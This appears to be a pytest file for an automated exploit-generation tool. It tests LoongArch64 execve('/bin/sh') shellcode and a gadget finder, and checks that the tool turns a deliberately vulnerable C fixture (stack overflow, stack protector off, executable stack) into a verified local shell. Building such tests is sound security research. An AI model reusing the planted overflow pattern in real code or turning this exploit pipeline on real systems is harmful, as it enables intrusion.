"""Cross-architecture ret2shellcode on LoongArch64: inject execve("/bin/sh") shellcode into an
execstack overflow and run it under qemu-user. The LoongArch `jmp <reg>` is `jr $rN`
(`jirl $zero, $rN, 0`), so the fixture leaves $t0 ($r12) pointing at the buffer and carries that
gadget. Fills the doc-49 5a hole: LoongArch64 was ret2libc-only (no shellcode stub)."""
import shutil
import subprocess

import pytest
from lykos.analyze.poc import rop, shellcode

_LA_GCC = shutil.which("loongarch64-linux-gnu-gcc")
_LA_QEMU = shutil.which("qemu-loongarch64") or shutil.which("qemu-loongarch64-static")


def test_execve_binsh_loongarch64_shape():
    sc = shellcode.execve_binsh_loongarch64()
    assert len(sc) == 28 and sc.endswith(b"/bin/sh\x00")
    assert sc[:4] == bytes.fromhex("a4000018")            # pcaddi $a0, 5


def test_write_marker_loongarch64_patches_length():
    sc = shellcode.write_marker_loongarch64(b"ZOK")       # 3-byte marker
    assert sc.endswith(b"ZOK") and len(sc) == 32 + 3
    # the length lands in the ori $a2,$zero,len immediate (bits [21:10]) at code offset 8
    instr = int.from_bytes(sc[8:12], "little")
    assert instr == (0x03800006 | (3 << 10))


def test_find_br_gadgets_loongarch64():
    seg = (0x4C000080).to_bytes(4, "little")              # jr $a0  (jirl $zero,$r4,0)
    orig = rop._loads
    rop._loads = lambda data: [(0, len(seg), 0x120000000, 1)]
    try:
        g = rop.find_br_gadgets_loongarch64(seg)
    finally:
        rop._loads = orig
    assert any(x["reg"] == "r4" and x["va"] == 0x120000000 for x in g)


@pytest.mark.skipif(not (_LA_GCC and _LA_QEMU),
                    reason="needs loongarch64-linux-gnu-gcc + qemu-loongarch64")
def test_auto_files_l3_loongarch64_ret2shellcode(store, tmp_path):
    """strategy=auto drives a LoongArch64 execstack overflow with a `jr $t0` gadget ($t0 left
    pointing at the buffer) to a confirmed L3: injected execve("/bin/sh") shellcode runs under
    qemu-user and spawns a real shell (or writes a marker), the redirect recovered with no leak."""
    from lykos.analyze import register
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    src = tmp_path / "v.c"
    src.write_text(
        '#include <unistd.h>\n#include <stdio.h>\n'
        '__asm__(".text\\n.globl g\\ng:\\n jr $r12\\n");\n'           # jr $t0 -> jump to $t0
        'void vuln(void){ char b[256]; read(0,b,1024);'
        ' __asm__ volatile("move $r12, %0"::"r"(b):"$r12"); }\n'      # $t0 = &b, last before ret
        'int main(void){ setbuf(stdout,0); vuln(); return 0; }\n')
    exe = tmp_path / "v"
    if subprocess.run([_LA_GCC, "-O0", "-fno-stack-protector", "-no-pie", "-static",
                       "-z", "execstack", "-w", str(src), "-o", str(exe)],
                      capture_output=True).returncode:
        pytest.skip("cannot build loongarch64 execstack fixture")
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, store.cases.create("la64sc").id, exe, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True)
        assert pool.wait_idle(180)
        assert (store.targets.get(t.id).mitigations or {}).get("nx") == "off"   # execstack
        run = enqueue_exploit(q, t, params={"strategy": "auto"})
        assert pool.wait_idle(400) and q.runs.get(run.id).status == "done"
    finally:
        pool.stop(grace=3.0)
    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert l3, "no confirmed L3 loongarch64 ret2shellcode"
